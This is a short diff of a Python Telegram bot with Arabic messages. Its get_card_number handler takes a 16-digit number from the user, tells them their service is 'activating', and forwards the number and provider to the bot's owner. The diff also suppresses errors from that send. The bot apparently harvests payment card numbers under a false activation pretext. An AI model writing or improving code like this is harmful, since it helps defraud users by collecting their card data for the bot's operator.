@@ -181,8 +181,7 @@ def get_card_number(message, provider):
         bot.reply_to(message, "جاري التفعيل..")
         try: 
             bot.send_message(OWNER_ID, f"طلب جديد:\nالمزود: {provider}\nالرقم: {message.text}")
-        except Exception as e:
-            print(f"⚠️ فشل إرسال الطلب للمالك: {e}")
+        except: pass
     else:
         msg = bot.reply_to(message, "خطأ: يرجى إرسال 16 رقماً فقط.")
         bot.register_next_step_handler(msg, lambda m: get_card_number(m, provider))
